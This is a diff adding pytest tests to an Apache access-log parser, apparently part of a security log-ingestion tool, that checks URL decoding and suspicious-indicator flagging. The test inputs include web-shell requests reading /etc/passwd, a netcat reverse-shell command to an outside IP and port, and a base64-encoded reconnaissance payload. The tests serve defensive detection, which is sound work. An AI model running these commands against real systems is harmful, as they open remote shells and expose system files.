@@ -32,6 +32,36 @@ class TestApacheParser:
         assert rows[0]["http_referrer"] == "https://example.test/"
         assert rows[0]["http_user_agent"] == "curl/8.0"
 
+    def test_url_encoded_path_is_safely_decoded(self):
+        from app.ingest.linux.apache import parse_apache
+
+        rows = parse_apache('192.0.2.10 - - [10/Oct/2024:13:55:36 +0000] "GET /shell.php?cmd=cat%20%2Fetc%2Fpasswd HTTP/1.1" 200 12\n', source_path="/var/log/apache2/access.log")
+        assert rows[0]["url_path"] == "/shell.php?cmd=cat%20%2Fetc%2Fpasswd"
+        assert rows[0]["url_path_decoded"] == "/shell.php?cmd=cat /etc/passwd"
+
+    def test_generic_shell_keyword_flagged_after_decoding(self):
+        from app.ingest.linux.apache import parse_apache
+
+        rows = parse_apache('192.0.2.10 - - [10/Oct/2024:13:55:36 +0000] "GET /x.php?c=nc%20-e%20%2Fbin%2Fsh%20203.0.113.9%209999 HTTP/1.1" 200 0\n', source_path="/var/log/apache2/access.log")
+        assert "nc -e" in rows[0]["suspicious_url_indicators"] or "/bin/sh" in rows[0]["suspicious_url_indicators"]
+        assert "ip_port_reference" in rows[0]["suspicious_url_indicators"]
+
+    def test_base64_segment_is_passively_decoded_and_flagged(self):
+        import base64
+        from app.ingest.linux.apache import parse_apache
+
+        payload = base64.b64encode(b"whoami; id; uname -a").decode()
+        rows = parse_apache(f'192.0.2.10 - - [10/Oct/2024:13:55:36 +0000] "GET /x.php?p={payload} HTTP/1.1" 200 0\n', source_path="/var/log/apache2/access.log")
+        assert rows[0]["url_base64_decoded"] == ["whoami; id; uname -a"]
+        assert "embedded_base64" in rows[0]["suspicious_url_indicators"]
+
+    def test_ordinary_request_has_no_suspicious_indicators(self):
+        from app.ingest.linux.apache import parse_apache
+
+        rows = parse_apache('192.0.2.10 - - [10/Oct/2024:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 512\n', source_path="/var/log/apache2/access.log")
+        assert rows[0]["suspicious_url_indicators"] == []
+        assert rows[0]["url_base64_decoded"] == []
+
     def test_error_log(self):
         from app.ingest.linux.apache import parse_apache
 
